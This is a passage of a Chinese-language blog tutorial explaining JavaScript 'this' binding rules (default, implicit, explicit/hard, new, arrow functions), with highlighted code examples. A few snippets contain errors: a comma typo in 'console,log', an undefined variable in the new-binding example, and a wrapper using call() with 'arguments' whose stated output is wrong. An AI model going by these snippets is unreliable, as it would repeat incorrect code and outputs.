number;</span><br><span class="line">      <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">      number = number * <span class="number">2</span>;</span><br><span class="line">      number = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">          <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">          <span class="built_in">console</span>.log(num);</span><br><span class="line">          number *= <span class="number">3</span>;</span><br><span class="line">          <span class="built_in">console</span>.log(number);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fn1 = obj.fn1;</span><br><span class="line">fn1.call(<span class="literal">null</span>);</span><br><span class="line">obj.fn1();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.number);</span><br></pre></td></tr></table></figure><p>如果你思考出来的结果，与在浏览中执行结果相同，并且每一步的依据都非常清楚，那么，你可以选择继续往下阅读，或者关闭本网页，愉快得去玩耍。如果你有一部分是靠蒙的，或者对自己的答案并不那么确定，那么请继续往下阅读。</p><h3 id="this是什么？"><a href="#this是什么？" class="headerlink" title="this是什么？"></a>this是什么？</h3><p>this是什么？首先记住this不是指向自身！this 就是一个指针，指向调用函数的对象。（谁调用了方法，该方法的this就指向谁）</p><h3 id="this的绑定规则有哪些？"><a href="#this的绑定规则有哪些？" class="headerlink" title="this的绑定规则有哪些？"></a>this的绑定规则有哪些？</h3><p>1、默认绑定<br>2、隐式绑定<br>3、显式绑定<br>4、new绑定</p><p>当前测试环境：浏览器环境</p><h4 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h4><p>默认绑定，在不能应用其它绑定规则时使用的默认规则，通常是独立函数调用</p><blockquote><p>独立函数调用时，this 指向全局对象，如果使用严格模式，那么全局对象无法使用默认绑定，this指向undefined，undefined上没有this对象，会抛出错误</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">foo();  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>严格模式时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line">  <span class="built_in">console</span>,log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">foo();  <span class="comment">// TypeError: this is undefined</span></span><br></pre></td></tr></table></figure><p>如需在node当中执行的请自行测试</p><h4 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h4><p>函数的调用是在某个对象上触发的，即调用位置上存在上下文对象（即函数作为引用属性被添加到对象中），隐式绑定规则会把函数调用中的 this 绑定到这个上下文对象。典型的形式为 XXX.fun().我们来看一段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'Jack'</span>,</span><br><span class="line">  person: person</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Julie'</span>;</span><br><span class="line">obj.person();  <span class="comment">// Jack</span></span><br></pre></td></tr></table></figure><p>person函数声明在外部，严格来说并不属于obj，但是在调用person时,调用位置会使用obj的上下文来引用函数，隐式绑定会把函数调用中的this(即此例person函数中的this)绑定到这个上下文对象（即此例中的obj）</p><p>需要注意的是：对象属性引用链中只有最后一层会影响调用位置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  name: <span class="string">'Jack'</span>,</span><br><span class="line">  friend: obj2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">  name: <span class="string">'Lucky'</span>,</span><br><span class="line">  person: person</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Julie'</span>;</span><br><span class="line">obj1.friend.person();  <span class="comment">// Lucky</span></span><br></pre></td></tr></table></figure><p>因为只有最后一层会确定this指向的是什么，不管有多少层，在判断this的时候，我们只关注最后一层，即此处的friend。</p><p><strong>隐式丢失</strong></p><p>隐式丢失指的是函数中的 this 丢失绑定对象，即它会应用第 1 条的默认绑定规则，从而将 this 绑定到全局对象或者 undefined 上，取决于是否在严格模式下运行。</p><ul><li>绑定至上下文对象的函数被赋值给一个新的函数，然后调用这个新的函数时</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'Jack'</span>,</span><br><span class="line">  person: person</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Julie'</span>;</span><br><span class="line"><span class="keyword">var</span> bar = obj.person;</span><br><span class="line">bar() <span class="comment">// Julie</span></span><br></pre></td></tr></table></figure><ul><li>传入回调函数时：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  fn()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'Jack'</span>,</span><br><span class="line">  person: person</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Julie'</span>;</span><br><span class="line"></span><br><span class="line">handle(obj.person) <span class="comment">// Julie</span></span><br></pre></td></tr></table></figure><p>其实这就是第一种情况的变种，实际上参数传递就是一种隐式赋值。除了开发人员自定义的函数，在将函数传入语言内置的函数比如 setTimeout 时，同样会发生隐式丢失的情况。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello,'</span>, <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    name: <span class="string">'Jack'</span>,</span><br><span class="line">    person: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Hello,'</span>,<span class="keyword">this</span>.name);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">    name: <span class="string">'Lucky'</span>,</span><br><span class="line">    person: person</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> name=<span class="string">'Julie'</span>;</span><br><span class="line"></span><br><span class="line">obj1.person();</span><br><span class="line">setTimeout(obj2.person,<span class="number">100</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    obj2.person();</span><br><span class="line">&#125;,<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hello, Julie</span></span><br><span class="line"><span class="comment">// Hello, Julie</span></span><br><span class="line"><span class="comment">// Hello, Lucky</span></span><br></pre></td></tr></table></figure><ul><li><p>第一条输出很容易理解，setTimeout的回调函数中，this使用的是默认绑定，非严格模式下，执行的是全局对象</p></li><li><p>第二条输出是不是有点迷惑了？说好XXX.fun()的时候，fun中的this指向的是XXX呢，为什么这次却不是这样了！Why?</p><p>其实这里我们可以这样理解: setTimeout(fn,delay){ fn(); },相当于是将obj2.person赋值给了一个变量，最后执行了变量，这个时候，person中的this显然和obj2就没有关系了。</p></li><li><p>第三条虽然也是在setTimeout的回调中，但是我们可以看出，这是执行的是obj2.person()使用的是隐式绑定，因此这是this指向的是obj2，跟当前的作用域没有任何关系。</p></li></ul><h4 id="显式绑定"><a href="#显式绑定" class="headerlink" title="显式绑定"></a>显式绑定</h4><p>显式绑定就是通过call,apply,bind的方式，显式的指定this所指向的对象</p><blockquote><p>call,apply和bind的第一个参数，就是对应函数的this所指向的对象。call和apply的作用一样，只是传参方式不同。call和apply都会执行对应的函数，而bind方法不会。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call(obj);  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>如果 call 或者 apply 传入的第一个参数是原始值（字符串类型、布尔类型或者数字类型），那么该原始值会被转换成它的对象形式（new String()、new Boolean() 或 new Number()），俗称“装箱”</p><p>如果 call 或者 apply 传入的第一个参数为<code>null</code> or <code>undefined</code>，会绑定到<code>window</code>上</p><p>显式绑定仍然无法解决丢失绑定问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello,'</span>, <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">'YvetteLau'</span>,</span><br><span class="line">    sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Wiliam'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    fn();</span><br><span class="line">&#125;</span><br><span class="line">Hi.call(person, person.sayHi);</span><br></pre></td></tr></table></figure><p>输出的结果是 Hello, Wiliam. 原因很简单，Hi.call(person, person.sayHi)的确是将this绑定到person中了。但是在执行fn的时候，相当于直接调用了sayHi方法(记住: person.sayHi已经被赋值给fn了，隐式绑定也丢了)，没有指定this的值，对应的是默认绑定。</p><p>如果我们希望绑定不会丢失，要怎么做？很简单，调用fn的时候，给它硬绑定。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello,'</span>, <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">'YvetteLau'</span>,</span><br><span class="line">    sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Wiliam'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    fn.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">Hi.call(person, person.sayHi);</span><br></pre></td></tr></table></figure><p>此时，输出的结果为: Hello, YvetteLau，因为person被绑定到Hi函数中的this上，fn又将这个对象绑定给了sayHi的函数。这时，sayHi中的this指向的就是person对象。</p><h5 id="硬绑定"><a href="#硬绑定" class="headerlink" title="硬绑定"></a>硬绑定</h5><p>作为显式绑定的一个变种，硬绑定可以解决丢失绑定问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  foo.call(obj);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">bar();  <span class="comment">// 2</span></span><br><span class="line">setTimeout(bar, <span class="number">100</span>);  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">bar.call(<span class="built_in">window</span>);  <span class="comment">//无效，硬绑定的 bar 不会再修改它的 this</span></span><br></pre></td></tr></table></figure><p>在一个新的函数内部强制绑定 this 到某个对象上，无论之后如何调用这个新的函数，其 this 都不会丢失。</p><p>典型应用场景为创建一个包裹函数，传入所有的参数并返回接收到的所有值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">something</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.a, something);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.a + something;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a:<span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> foo.call(obj, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = bar(<span class="number">3</span>);  <span class="comment">// 2 3</span></span><br><span class="line"><span class="built_in">console</span>.log(b);  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>或者将绑定的对象改为可配置，这样就成了一个辅助绑定函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">fn, obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fn.apply(obj, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于硬绑定实在太过常见，所以 ES5 提供了内置的 Function.prototype.bind，其用法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">something</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.a, something);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.a + something;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = foo.bind(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = bar(<span class="number">3</span>);  <span class="comment">// 2 3</span></span><br><span class="line"><span class="built_in">console</span>.log(b);  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h5 id="API-调用的“上下文”"><a href="#API-调用的“上下文”" class="headerlink" title="API 调用的“上下文”"></a>API 调用的“上下文”</h5><p>JavaScript 自身以及许多第三方库的函数都提供了一个可选的参数，通常被称为“上下文”，其作用和 bind(..) 一样，确保回调函数使用指定的 this。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( el, <span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  id: <span class="string">"awsome"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 foo(..) 时把 this 绑定到 obj</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].forEach(foo, obj);</span><br><span class="line"><span class="comment">// 1 awsome 2 awsome 3 awsome</span></span><br></pre></td></tr></table></figure><p>实际上这些函数背后还是调用了 call() 或者 apply() ，只不过这样开发者需要写的代码就少了一些。</p><h4 id="new-绑定"><a href="#new-绑定" class="headerlink" title="new 绑定"></a>new 绑定</h4><p>使用 new 来调用函数时，会自动执行下面的操作：</p><ul><li>创建一个全新的对象</li><li>这个新对象会被执行 [[原型]] 连接</li><li>这个新对象会绑定到函数调用的 this</li><li>如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(bar.a);  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h4 id="绑定优先级"><a href="#绑定优先级" class="headerlink" title="绑定优先级"></a>绑定优先级</h4><p>new绑定 &gt; 显式绑定 &gt; 隐式绑定 &gt; 默认绑定</p><h4 id="绑定例外"><a href="#绑定例外" class="headerlink" title="绑定例外"></a>绑定例外</h4><p>1、如果把 null 或者 undefined 作为 this 的绑定对象传入 call、apply 或者 bind，那么这些值在调用时会被忽略，实际应用的是默认绑定规则。（书中推荐使用一个空对象来绑定 this）</p><p>2、间接引用。这种情况容易在赋值时发生：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>；</span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">3</span>, <span class="attr">foo</span>: foo&#125;;</span><br><span class="line"><span class="keyword">var</span> p = &#123;<span class="attr">a</span>: <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">o.foo();  <span class="comment">// 3</span></span><br><span class="line">(p.foo = o.foo)();  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>p.foo() 实际上引用了 foo() ，如此，会应用默认绑定。</p><p>3、箭头函数</p><p>箭头函数在使用时，需要注意以下几点:</p><ul><li>函数体内的this对象，继承的是外层代码块的this。</li><li>不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。</li><li>不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。</li><li>不可以使用yield命令，因此箭头函数不能用作 Generator 函数。</li><li>箭头函数没有自己的this，所以不能用call()、apply()、bind()这些方法去改变this的指向.</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    hi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    say: <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> hi = obj.hi();  <span class="comment">//输出obj对象</span></span><br><span class="line">hi();               <span class="comment">//输出obj对象</span></span><br><span class="line"><span class="keyword">let</span> sayHi = obj.sayHi();</span><br><span class="line"><span class="keyword">let</span> fun1 = sayHi(); <span class="comment">//输出window</span></span><br><span class="line">fun1();             <span class="comment">//输出window</span></span><br><span class="line">obj.say();          <span class="comment">//输出window</span></span><br><span class="line"><span class="keyword">let</span> fun2 = sayHi.bind(obj)();<span class="comment">//输出obj</span></span><br><span class="line">fun2();                      <span class="comment">//输出obj</span></span><br></pre></td></tr></table></figure><p>按照上面所说say中的this应该是obj才对，但为什么是window呢？我们来分析一下：</p><ul><li>obj.hi(); 对应了this的隐式绑定规则，this绑定在obj上，所以输出obj，很好理解。  </li><li>hi(); 这一步执行的就是箭头函数，箭头函数继承上一个代码库的this，刚刚我们得出上一层的this是obj，显然这里的this就是obj.  </li><li>执行sayHi();这一步也很好理解，我们前面说过这种隐式绑定丢失的情况，这个时候this执行的是默认绑定，this指向的是全局对象window.  </li><li>fun1(); 这一步执行的是箭头函数，如果按照之前的理解，this指向的是箭头函数定义时所在的对象，那么这儿显然是说不通。OK，按照箭头函数的this是继承于外层代码库的this就很好理解了。外层代码库我们刚刚分析了，this指向的是window，因此这儿的输出结果是window.  </li><li>obj.say(); 执行的是箭头函数，当前的代码块obj中是不存在this的，只能往上找，就找到了全局的this，指向的是window.  </li></ul><p>4、<code>this</code> 遇见 <code>return</code></p><p>如果return一个对象或者是function的话，this指向的是这个对象或者是function~</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'james'</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name: <span class="string">'jack'</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span 